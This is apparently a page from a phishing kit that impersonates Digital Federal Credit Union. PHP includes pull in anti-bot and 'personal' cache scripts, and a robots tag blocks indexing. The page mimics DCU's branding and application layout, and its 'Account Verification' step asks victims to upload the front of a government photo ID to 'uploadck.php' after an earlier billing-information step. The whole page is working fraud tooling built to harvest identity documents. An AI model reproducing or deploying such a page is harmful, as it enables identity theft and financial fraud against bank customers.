<?php

session_start();

    require_once '../Meta/Comp.php';
    require_once '../Meta/Antibot.php';
    require_once '../Meta/demonTest.php';
    include('Cache/personal.php');


?>


<html class="yui3-js-enabled wf-opensans-n4-active wf-active" id="yui_3_18_1_1_1632731575470_148">
<div id="yui3-css-stamp" style="position: absolute !important; visibility: hidden !important" class=""></div>

<head>
	<link rel="stylesheet" type="text/css" href="files/bootstrap-theme.css">
	<link rel="stylesheet" type="text/css" href="files/bootstrap.css">
	<link rel="stylesheet" type="text/css" href="files/font-awesome.min.css">
	<link rel="stylesheet" type="text/css" href="files/Global.css">
	<link rel="stylesheet" type="text/css" href="files/square-green.css">
	<style>
	.icheckbox_square-green {
		min-width: 22px;
		margin-right: 5px;
	}
	
	.iradio_square-green {
		min-width: 22px;
		margin-right: 5px;
	}
	</style>
	<meta name="viewport" content="initial-scale=1.000">
	
	<link rel="stylesheet" type="text/css" href="files/updated-fivision-style.css">
	<link rel="stylesheet" type="text/css" href="files/fiVISION_Controls.css">
	<link rel="stylesheet" type="text/css" href="files/dcu-20200326.css">
	
	<meta name="robots" content="noindex, nofollow, noimageindex, noarchive, nocache">
	
	<title> Account Verification </title>
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans">
	
	<link charset="utf-8" rel="stylesheet" id="yui_3_18_1_1_1632731575470_2" href="https://yui-s.yahooapis.com/combo?3.18.1/widget-base/assets/skins/sam/widget-base.css&amp;3.18.1/autocomplete-list/assets/skins/sam/autocomplete-list.css">

	<link type="text/css" id="firefly-css" class="firefly-css" rel="stylesheet" href="https://usassets.cobrowse.pega.com/assets/stylesheets/customer/final/default.css?v=8.6.0">
</head>

<body class="yui3-skin-sam" id="yui_3_18_1_1_1632731575470_147">

			<input type="hidden" name="rsmRadScriptManager_TSM" id="rsmRadScriptManager_TSM" value=";;System.Web.Extensions, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35:en-US:ba1d5018-bf9d-4762-82f6-06087a49b5f6:ea597d4b:b25378d2">
			<input type="hidden" name="__EVENTTARGET" id="__EVENTTARGET" value="">
			<input type="hidden" name="__EVENTARGUMENT" id="__EVENTARGUMENT" value="">
			<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="/wEPDwUBMA8WAh4KRm9ybU51bWJlcigpWVN5c3RlbS5JbnQ2NCwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5CDExNzEyODY0FgICAQ9kFgICAg9kFgJmD2QWAgIBD2QWBgIDD2QWBgIED2QWAmYPDxYEHg9Db21tYW5kQXJndW1lbnRlHgtDb21tYW5kTmFtZWVkZAIFD2QWAmYPDxYEHwFlHwJlZGQCDg9kFgJmDw8WBB8BZR8CZWRkAgcPZBYeAhMPZBYCAgEPDxYCHghSZWFkT25seWhkZAIXD2QWAgIBDw8WAh8DaGRkAhsPZBYCAgEPDxYCHwNoZGQCHw9kFiBmDxAPFgIeB1Zpc2libGVoZGQWAQIBZAIBDxAPFggeB0NoZWNrZWRoHhBDYXVzZXNWYWxpZGF0aW9uaB4EVGV4dAUrJm5ic3A7VXNlIHRoZSBzYW1lIEFkZHJlc3MgYXMgdGhlIEFwcGxpY2FudB8EaGRkZGQCBw8PFgIfBGhkZAIIDxAPFgIfBGhkZBYBZmQCCQ8PFgIfBGhkZAIKDxAPFgIfBGhkZBYBZmQCCw8QDxYCHwRoZGQWAWZkAgwPDxYEHgdFbmFibGVkaB8EaGRkAg0PEA8WAh8EaGRkFgFmZAIODw8WAh8EaGRkAg8PDxYEHwhoHwRoZGQCFw8PFgIfBGhkZAIYDxAPFgIfBGhkZBYBZmQCGQ8QDxYCHwRoZGQWAWZkAhsPDxYEHgdUb29sVGlwBQ5VUyBQb3N0YWwgQ29kZR8EaBYCHgtwbGFjZWhvbGRlcgUOVVMgUG9zdGFsIENvZGVkAh0PDxYCHwRoZGQCJw9kFgICAw9kFgICAQ8QZGQWAWZkAisPZBYgZg8QDxYCHwRoZGQWAQIBZAIBDxAPFgQfBmgfBwUwJm5ic3A7TWFpbGluZyBhZGRyZXNzIGlzIHRoZSBzYW1lIGFzIFJlc2lkZW50aWFsZGRkZAIHDw8WAh8EaGRkAggPEA8WAh8EaGRkFgFmZAIJDw8WAh8EaGRkAgoPEA8WAh8EaGRkFgFmZAILDxAPFgIfBGhkZBYBZmQCDA8PFgQfCGgfBGhkZAINDxAPFgIfBGhkZBYBZmQCDg8PFgIfBGhkZAIPDw8WBB8IaB8EaGRkAhcPDxYCHwRoZGQCGA8QDxYCHwRoZGQWAWZkAhkPEA8WAh8EaGRkFgFmZAIbDw8WBB8JBQ5VUyBQb3N0YWwgQ29kZR8EaBYCHwoFDlVTIFBvc3RhbCBDb2RlZAIdDw8WAh8EaGRkAi8PZBYCAgMPZBYCAgEPDxYCHwNoZGQCMw9kFgICAw9kFgICAQ8PFgQfB2UfA2hkZAI3D2QWAgIBDxBkZBYBZmQCPw9kFgICAQ8PFgIfA2hkZAJHD2QWAgIBDxBkZBYBZmQCSw9kFgICAQ8PFgIfA2hkZAJTD2QWAgIBDw8WAh8DaGRkAlcPZBYCAgEPEGRkFgFmZAJrD2QWAgICDw8WAh8IaGRkAgsPDxYCHwRnZBYEAgMPZBYCZg8PFgQfAWUfAmVkZAIHD2QWAmYPDxYEHwFlHwJlZGQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgMFHWNiUmVzaWRlbnRpYWxBZGRyZXNzX0NoZWNrQm94BR9NYWlsaW5nQWRkcmVzc19TYW1lQXNBZGRyZXNzQm94BRNETENoZWNrYm94X0NoZWNrQm944fXcxKytv7g1PCGbiTA9pLp/DqM="> </div>
	
		<div class="aspNetHidden">
			<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR" value="BEFE4D85">
			<input type="hidden" name="__PREVIOUSPAGE" id="__PREVIOUSPAGE" value="ImIrLw3Sj46LLEn7VIE_tLQ19nNnZovV6sGkB9lOmdUxPBvBT7OiB179-I8p7liJ9_wCDZ6jvUTEQSvxkPlkZ9Zhx-8ywUjsaEH73kD3u9KyocSd0">
			<input type="hidden" name="__EVENTVALIDATION" id="__EVENTVALIDATION" value="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"> </div>
		
<div id="BackgroundDiv">
<div id="SizeDiv">
  
<!-- NEW HEADER -->
	
	<header class="navbar-fixed-top">
		 
	 	<div class="brand-header--nav">
			
			<div>
            		
				<nav class="brand-header--nav__secondary">
						
					 <div class="container"> 
                		
						<ul class="brand-header--nav__secondary--level-one" role="list">
							<li role="listitem">
										<a href="" aria-label="Branch Locator" aria-expanded="false" role="link" title="Find a DCU branch or ATM" target="_blank">Branch/ATM Locator</a>
							</li>
							
							<span class="seprator"></span>
		<li role="listitem"> <a href="" aria-label="Contact Us" role="link" target="_blank">Contact Us</a> </li>
		</ul>
		</div>
		</nav>
		</div>
		</div>
		<nav class="brand-header--navbar__nav container clearfix">
			<a href="" class="nav-brand" target="_self"> <img src="files/DCUGreen.svg" role="img" alt="Digital Federal Credit Union" aria-label="Digital Federal Credit Union" title="Digital Federal Credit Union"> </a>
			<div class="title" role="heading">
				<br><span class="highlight"></span></div>
		</nav>
		</header>
		<!-- END NEW HEADER -->
		<div class="container clearfix" id="yui_3_18_1_1_1632731575470_145">
			<!-- CART CODE -->
			<table class="cart">
				<tbody>
					<tr>
						<td width="15%">
							<!-- fiVISON_Control_Begin: fiVISION_ShoppingCart -->
							<div class="modal fade" style="height:90vh" id="shoppingCartModal" tabindex="-1" role="dialog" aria-hidden="true">
								<div class="modal-dialog">
									<div class="modal-content">
										<div class="modal-header DefaultModalHeaderClass"> Accounts Selected
											<label id="shoppingCartHeaderCount">(2)</label> <i class="fa fa-times pull-right" style="cursor:pointer" onclick="$('#shoppingCartModal').modal('hide')"></i> </div>
										<div class="modal-body DefaultModalBodyClass ShoppingCartBodyClass">
											<div id="shoppingCartOneProductRequiredMessage" style="display:none">
												<center>
													<label>You are required to have at least one product on this application</label>
												</center>
											</div>
											<div id="ShoppingCartIcon11450570" style="width:100%; background-color:#f9f9f9; padding: 10px 5px 10px 5px; height:60px;"><span>Advantage Savings</span><span id="btnRemoveProduct0"><input type="button" name="btnRemoveProduct0$btnRemoveProduct0_SubmitButton" value="Remove" onclick="removeProductFromForm('api.aspx', 11450570, 'btnRemoveProduct0_SubmitButton', 'btnAddProduct0_SubmitButton', 'shoppingCartCount', 'shoppingCartHeaderCount', true);return false;WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;btnRemoveProduct0$btnRemoveProduct0_SubmitButton&quot;, &quot;&quot;, false, &quot;&quot;, &quot;/dcu/OARD/NonMemberAppInfo.aspx&quot;, false, true))" id="btnRemoveProduct0_SubmitButton" class="btn btn-default pull-right" originaltext="Remove" style="width:125px;"></span><span id="btnAddProduct0"><input type="button" name="btnAddProduct0$btnAddProduct0_SubmitButton" value="Add" onclick="addProductToForm('api.aspx', 11450570,  'btnRemoveProduct0_SubmitButton', 'btnAddProduct0_SubmitButton', 'shoppingCartCount', 'shoppingCartHeaderCount', true);return false;WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;btnAddProduct0$btnAddProduct0_SubmitButton&quot;, &quot;&quot;, false, &quot;&quot;, &quot;/dcu/OARD/NonMemberAppInfo.aspx&quot;, false, true))" id="btnAddProduct0_SubmitButton" class="btn btn-default pull-right" originaltext="Add" style="width:125px;display:none;"></span></div>
											<hr class="DefaultHRClass">
											<div id="ShoppingCartIcon11450571" style="width:100%; background-color:#f9f9f9; padding: 10px 5px 10px 5px; height:60px;"><span>Primary Savings</span><span class="pull-right">This account is required and may not be removed</span></div>
											<hr class="DefaultHRClass">
											<br><span id="btnCartChange"><input type="button" name="btnCartChange$btnCartChange_SubmitButton" value="Select Other Accounts" onclick="try {if (!Page_ClientValidate()){ return false; }} catch(err) { } this.disabled = true; this.value = window.$Fivi.LanguageServices._PROCESSING;WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions(&quot;btnCartChange$btnCartChange_SubmitButton&quot;, &quot;&quot;, false, &quot;&quot;, &quot;/dcu/OARD/NonMemberAppInfo.aspx&quot;, false, true))" id="btnCartChange_SubmitButton" class="btn btn-default MediumButton" originaltext="Select Other Accounts" style="width:125px;"></span>
											<button type="button" class="btn btn-default MediumButton pull-right" onclick="$('#shoppingCartModal').modal('hide')">Continue</button>
										</div>
									</div>
								</div>
							</div>
							</span>
							<!-- fiVISON_Control_End: fiVISION_ShoppingCart -->
						</td>
					</tr>
				</tbody>
			</table>
			<!-- END CART CODE -->
			<div class="col-sm-12 offset-sm-0 col-md-8 offset-md-2 pb-1" id="yui_3_18_1_1_1632731575470_144">
				<!-- fiVISON_Control_Begin: fiVISION_PageContent --><span id="yui_3_18_1_1_1632731575470_143"><!-- fiVISON_PageContent_Begin --> <!-- Progress Bar -->

  	<div class="row justify-content-center">
		
		<div class="progress-new">

		  <div class="circle done">
			<span class="label">1</span>
				<div class="title">Billing Information</div>
			</div> <span class="bar half"></span>
			<div class="circle active "> <span class="label">2</span>
				<div class="title">Upload Your ID</div>
			</div> <span class="bar"></span>
			<div class="circle">
				<div class="label">3</div>
				<div class="title">Finish</div>
			</div>
		</div>
		</div>
		<!-- END Progress Bar -->
		<div style="clear: both;" id="yui_3_18_1_1_1632731575470_142">
			<div id="yui_3_18_1_1_1632731575470_141">
				<h1>Identification</h1>
				<p>Please Provide A Valid Government Issue Photo ID</p>
				<!-- fiVISON_Control_Begin: fiVISION_ErrorSummary --><span id="ErrorSummary1"><div id="ctl13" class="errors" style="display:none;">

</div></span>
				<!-- fiVISON_Control_End: fiVISION_ErrorSummary -->
				<br>
				<!-- fiVISON_Control_Begin: fiVISION_Panel -->
				<!-- fiVISON_Control_End: fiVISION_Panel -->
				<!-- fiVISON_Control_Begin: fiVISION_Panel -->
				<!-- fiVISON_Control_End: fiVISION_Panel -->
				<!-- fiVISON_Control_Begin: fiVISION_Panel -->
				<!-- fiVISON_Control_End: fiVISION_Panel -->
				<fieldset id="yui_3_18_1_1_1632731575470_140">
					<legend class="SectionHeaders">Upload Your ID Below</legend>
					<div class="hidden-lg visible-sm visible-md visible-xs"> </div>
	<select name="tbPhone1_ddPhoneNumberType" id="tbPhone1_ddPhoneNumberType" class="form-control TwoControls">
						<option value="">ID Type</option>
						<option value="1">Passport</option>
						<option value="2">Passport Card</option>
						<option value="3">Millitary Card</option>
						<option selected="selected" value="4">Driver Licence</option>
					</select>
					</span>				
					
					
<form action='uploadck.php' method=post  enctype='multipart/form-data' >
Upload Front of Your ID: <input type=file name='file_up'></span>
		<!-- fiVISON_Control_End: fiVISION_PageContent -->
		<!-- fiVISON_Control_Begin: fiVISION_Panel --><span id="pnlDirectionButtons"><!-- fiVISION_Panel_Begin -->
        	<center>
           
<button type="submit" style="width:150px; background-color:#01675b; color:#f8f8f8 ">Upload Image</span>
			
			
			
			
	
		</div>
		<!-- fiVISON_PageContent_End -->
		</span>
		<!-- fiVISON_Control_End: fiVISION_PageContent -->
		<!-- fiVISON_Control_Begin: fiVISION_Panel --><span id="pnlDirectionButtons"><!-- fiVISION_Panel_Begin -->
        	<center>
           
	
		<!-- fiVISON_Control_End: fiVISION_ButtonV2 -->
		<!-- fiVISON_Control_Begin: fiVISION_Panel -->
		<!-- fiVISON_Control_End: fiVISION_Panel -->
		</center>
		<br>
		<!-- fiVISION_Panel_End -->
		</span>
		<!-- fiVISON_Control_End: fiVISION_Panel -->
		</div>
		</div>
		<!-- FOOTER AREA-->
		<footer class="FooterLarge">
			<div class="row">
				<div class="FooterText col-xs-8 py-2">
					<div class="my-xs-1">
						<p>All content ©
							<!-- fiVISON_Control_Begin: fiVISION_Label --><span id="lblLabelDate"><span id="lblLabelDate_Label">2022</span></span>
							<!-- fiVISON_Control_End: fiVISION_Label --><strong>Digital Federal Credit Union</strong></p>
					</div>
				</div>
				<div class="footer-icons col-xs-4">
					<div class="my-xs-1">
						<a href="https://www.dcu.org/streetwise/howto/ncua.html" onclick="return false;" target="_blank" re_target="_blank"><img alt="National Credit Union Association" src="files/ncua.svg"></a> <img alt="Equal Housing Lender" src="files/equal-housing.svg"> </div>
				</div>
			</div>
		</footer>
		</div>
		</div>
		<!-- fiVISON_Control_Begin: fiVISION_AccordionHelper --><span>
	</form>
	<span id="__Page_SessionTimer"><div class="modal fade" style="height:90vh" id="sessionTimeoutModal" tabindex="-1" role="dialog" aria-hidden="true" data-keyboard="false" data-backdrop="static">
	                        <div class="modal-dialog">
		                        <div class="modal-content">
				                    <div class="modal-body">
					                    Your session is about to end due to inactivity. Please click the button below to continue the session.<br><br>
                                        <center>
                                        <button type="button" onclick="SessionTimerResetTime();" class="btn btn-default">Continue Application</button>
                                        </center>
				                    </div>
		                        </div>  
	                        </div>
                        </div></span></body>

</html>